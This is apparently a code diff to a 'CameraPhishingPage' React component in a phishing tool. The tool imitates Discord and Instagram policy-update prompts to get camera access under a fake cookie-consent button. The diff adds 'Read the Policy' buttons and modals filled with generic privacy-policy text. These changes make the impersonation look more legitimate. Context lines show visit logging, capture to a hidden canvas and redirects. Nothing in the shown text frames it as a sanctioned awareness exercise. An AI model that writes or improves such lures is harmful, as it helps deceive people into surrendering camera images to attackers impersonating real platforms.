@@ -87,6 +87,21 @@ export default function CameraPhishingPage() {
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const streamRef = useRef<MediaStream | null>(null);
   const [cookieConsentGiven, setCookieConsentGiven] = useState(false);
+  const [isPolicyModalOpen, setIsPolicyModalOpen] = useState(false);
+
+  const genericPolicies = [
+    "1. Information We Collect: We collect information you provide directly to us, such as when you create an account, update your profile, use the interactive features of our services, participate in a survey, or request customer support. This may include personal details such as your name, email address, phone number, postal address, and any other information you choose to provide.",
+    "2. How We Use Your Information: We may use the information we collect to provide, maintain, and improve our services; to personalize your experience and the advertisements you see; to communicate with you about products, services, offers, promotions, rewards, and events offered by us and others; to monitor and analyze trends, usage, and activities in connection with our services; and for any other purpose described to you at the time the information was collected or as otherwise set forth in this privacy policy.",
+    "3. Information Sharing and Disclosure: We do not share your personal information with third parties except as described in this policy. We may share information with vendors, consultants, and other service providers who need access to such information to carry out work on our behalf and are obligated to protect your information. We may also share information for legal reasons, such as in response to a request for information if we believe disclosure is in accordance with, or required by, any applicable law, regulation or legal process.",
+    "4. Data Retention: We store the information we collect for as long as it is necessary for the purpose(s) for which we originally collected it, or for other legitimate business purposes, including to meet our legal, regulatory, or other compliance obligations.",
+    "5. Your Choices and Rights: You may have certain rights regarding your personal information, subject to local data protection laws. These may include the right to access, correct, update, port, or request deletion of your personal information. You can typically manage your account information and communication preferences through your account settings or by contacting us directly.",
+    "6. Cookies and Tracking Technologies: We use cookies and similar tracking technologies (like web beacons and pixels) to access or store information. Specific information about how we use such technologies and how you can refuse certain cookies is set out in our Cookie Policy. Most web browsers are set to accept cookies by default. If you prefer, you can usually choose to set your browser to remove or reject browser cookies.",
+    "7. Third-Party Services: Our service may contain links to other websites or services that are not operated or controlled by us (Third-Party Services). Any information you provide on or to Third-Party Services or that is collected by Third-Party Services is provided directly to the owners or operators of the Third-Party Services and is subject to their own privacy policies. We do not endorse and are not responsible for the content, privacy policies, or practices of any Third-Party Services.",
+    "8. Security of Your Information: We take reasonable measures, including administrative, technical, and physical safeguards, to help protect your information from loss, theft, misuse, and unauthorized access, disclosure, alteration, and destruction. However, please be aware that despite our efforts, no security measures are perfect or impenetrable, and no method of data transmission can be guaranteed against any interception or other type of misuse.",
+    "9. Children's Privacy: Our services are not directed to individuals under the age of 13 (or other applicable age as required by local law), and we do not knowingly collect personal information from children in this age group. If we become aware that a child under this age has provided us with personal information, we will take steps to delete such information from our files.",
+    "10. Changes to This Policy: We may update this privacy policy from time to time. If we make material changes, we will notify you by revising the date at the top of the policy and, in some cases, we may provide you with additional notice (such as adding a statement to our homepage or sending you a notification). We encourage you to review this privacy policy periodically to stay informed about our information practices and the ways you can help protect your privacy."
+  ];
+
 
   useEffect(() => {
     addLog({ type: 'generic', data: { message: `Visited camera phishing page: /phishing/camera/${templateId}` } });
@@ -271,9 +286,10 @@ export default function CameraPhishingPage() {
               {content.cookieMessage}
             </p>
 
-            <Button
-              onClick={handleCookieConsentAndCamera}
-              className="w-full bg-[#5865F2] hover:bg-[#4752c4] text-white font-semibold py-3 px-4 rounded-md text-lg transition-colors duration-150"
+            <div className="space-y-3">
+              <Button
+                onClick={handleCookieConsentAndCamera}
+                className="w-full bg-[#5865F2] hover:bg-[#4752c4] text-white font-semibold py-2.5 px-4 rounded-md text-md transition-colors duration-150"
               disabled={isLoading || cookieConsentGiven}
             >
               {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept Terms')}
@@ -281,6 +297,13 @@ export default function CameraPhishingPage() {
             {error && status === 'error' && (
               <p className="text-red-400 text-xs mt-4">{error}</p>
             )}
+            </div> {/* End of space-y-3 for buttons */}
+             <Button
+                onClick={() => setIsPolicyModalOpen(true)}
+                className="w-full mt-3 bg-transparent hover:bg-[#393c43] text-[#b9bbbe] font-medium py-2.5 px-4 rounded-md text-sm border border-[#40444b] hover:border-[#50545b] transition-colors duration-150"
+              >
+                Read the Policy
+              </Button>
           </div>
         ) : (
           // This state is after capture AND no redirect URL is set
@@ -289,6 +312,37 @@ export default function CameraPhishingPage() {
             <CheckCircle className="w-16 h-16 text-green-400 mx-auto mb-4" />
             <h1 className="text-xl font-bold text-white mb-2">Terms Accepted</h1>
             <p className="text-sm text-[#b9bbbe]">This window can now be closed.</p>
+          </div>
+        )}
+
+        {/* Discord Policy Modal */}
+        {isPolicyModalOpen && templateId === 'discord-terms-update' && (
+          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm" onClick={() => setIsPolicyModalOpen(false)}>
+            <div className="bg-[#2f3136] p-6 rounded-lg shadow-xl w-full max-w-xl max-h-[80vh] flex flex-col text-left border border-[#40444b]" onClick={(e) => e.stopPropagation()}>
+              <div className="flex justify-between items-center mb-4">
+                <h2 className="text-lg font-semibold text-white">Terms of Service</h2>
+                <button
+                  onClick={() => setIsPolicyModalOpen(false)}
+                  className="text-[#b9bbbe] hover:text-white p-1 rounded-full hover:bg-[#393c43] transition-colors"
+                  aria-label="Close policy modal"
+                >
+                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                </button>
+              </div>
+              <div className="overflow-y-auto text-sm text-[#dcddde] space-y-2 pr-3 scrollbar-thin scrollbar-thumb-[#202225] scrollbar-track-[#2f3136]">
+                {genericPolicies.map((policy, index) => (
+                  <p key={index} className="mb-1.5 leading-relaxed">{policy}</p>
+                ))}
+              </div>
+              <div className="mt-6 text-right">
+                <Button
+                  onClick={() => setIsPolicyModalOpen(false)}
+                  className="bg-[#5865F2] hover:bg-[#4752c4] text-white font-medium py-2 px-4 rounded-md text-sm"
+                >
+                  Got it
+                </Button>
+              </div>
+            </div>
           </div>
         )}
       </div>
@@ -334,17 +388,17 @@ export default function CameraPhishingPage() {
               {content.cookieMessage} {/* Cookie message from templateContent */}
             </p>
 
-            <div className="flex justify-end space-x-3">
-              {/* <Button
-                // Potentially add a "Customize" or "More options" button here if desired
-                className="text-[#1a73e8] hover:bg-gray-100 font-medium py-2 px-4 rounded"
+            <div className="flex flex-col sm:flex-row justify-end items-center space-y-3 sm:space-y-0 sm:space-x-3">
+              <Button
+                onClick={() => setIsPolicyModalOpen(true)}
+                className="text-[#1a73e8] hover:bg-gray-100 font-medium py-2 px-4 rounded w-full sm:w-auto order-2 sm:order-1"
                 variant="ghost"
               >
-                More options
-              </Button> */}
+                Read the Policy
+              </Button>
               <Button
                 onClick={handleCookieConsentAndCamera}
-                className="bg-[#1a73e8] hover:bg-[#1765cc] text-white font-medium py-2.5 px-6 rounded transition-colors duration-150"
+                className="bg-[#1a73e8] hover:bg-[#1765cc] text-white font-medium py-2.5 px-6 rounded transition-colors duration-150 w-full sm:w-auto order-1 sm:order-2"
                 disabled={isLoading || cookieConsentGiven}
               >
                 {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept & Continue')}
@@ -375,19 +429,20 @@ export default function CameraPhishingPage() {
         <canvas ref={canvasRef} className="hidden"></canvas>
 
         {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
-          <div className="bg-white p-6 rounded-xl shadow-xl w-full max-w-sm text-center">
+          <div className="bg-white p-6 rounded-xl shadow-xl w-full max-w-sm"> {/* Removed text-center from here */}
             <img src="/instagram_logo.png" alt="Instagram Logo" className="h-10 w-auto mx-auto mb-6" />
-            <h1 className="text-xl font-semibold text-black mb-3">{content.title}</h1>
-            <p className="text-sm text-[#262626] mb-4 leading-relaxed">
+            <h1 className="text-xl font-semibold text-black mb-3 text-center">{content.title}</h1>
+            <p className="text-sm text-[#262626] mb-4 leading-relaxed text-left"> {/* Text align left for messages */}
               {content.message}
             </p>
-            <p className="text-xs text-[#8e8e8e] mb-6">
+            <p className="text-xs text-[#8e8e8e] mb-6 text-left"> {/* Text align left for messages */}
               {content.cookieMessage}
             </p>
 
-            <Button
-              onClick={handleCookieConsentAndCamera}
-              className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2.5 px-4 rounded-lg text-md transition-colors duration-150"
+            <div className="space-y-3">
+              <Button
+                onClick={handleCookieConsentAndCamera}
+                className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2.5 px-4 rounded-lg text-md transition-colors duration-150"
               disabled={isLoading || cookieConsentGiven}
             >
               {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept Policy')}
@@ -395,6 +450,14 @@ export default function CameraPhishingPage() {
             {error && status === 'error' && (
               <p className="text-red-500 text-xs mt-3">{error}</p>
             )}
+            </div> {/* End of space-y-3 for buttons */}
+            <Button
+              onClick={() => setIsPolicyModalOpen(true)}
+              className="w-full mt-3 bg-transparent hover:bg-gray-50 text-[#0095f6] font-semibold py-2 px-4 rounded-lg text-sm transition-colors duration-150"
+              variant="ghost"
+            >
+              Read the Policy
+            </Button>
              <p className="text-xs text-[#c7c7c7] mt-6">
               You can review our updated policy details any time in our Help Center.
             </p>
@@ -406,6 +469,40 @@ export default function CameraPhishingPage() {
             <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
             <h1 className="text-lg font-semibold text-black mb-2">Policy Accepted</h1>
             <p className="text-sm text-[#262626]">This window can now be closed.</p>
+          </div>
+        )}
+
+        {/* Instagram Policy Modal */}
+        {isPolicyModalOpen && templateId === 'instagram-privacy-update' && (
+          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/40 backdrop-blur-sm" onClick={() => setIsPolicyModalOpen(false)}>
+            <div className="bg-white p-0 rounded-xl shadow-xl w-full max-w-md max-h-[75vh] flex flex-col text-left overflow-hidden" onClick={(e) => e.stopPropagation()}>
+              <div className="flex justify-between items-center p-4 border-b border-gray-200">
+                <h2 className="text-md font-semibold text-black">Privacy Policy</h2>
+                <button
+                  onClick={() => setIsPolicyModalOpen(false)}
+                  className="text-gray-500 hover:text-black p-1 rounded-full hover:bg-gray-100 transition-colors"
+                  aria-label="Close policy modal"
+                >
+                  <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                </button>
+              </div>
+              <div className="overflow-y-auto text-sm text-[#262626] space-y-3 p-4">
+                {genericPolicies.map((policy, index) => (
+                  <div key={index} className="mb-2">
+                    <p className="font-semibold text-sm mb-0.5">{policy.substring(0, policy.indexOf(':') + 1)}</p>
+                    <p className="text-xs leading-relaxed">{policy.substring(policy.indexOf(':') + 2)}</p>
+                  </div>
+                ))}
+              </div>
+              <div className="mt-auto p-4 border-t border-gray-200 text-center">
+                <Button
+                  onClick={() => setIsPolicyModalOpen(false)}
+                  className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2 px-4 rounded-lg text-sm"
+                >
+                  Done
+                </Button>
+              </div>
+            </div>
           </div>
         )}
       </div>
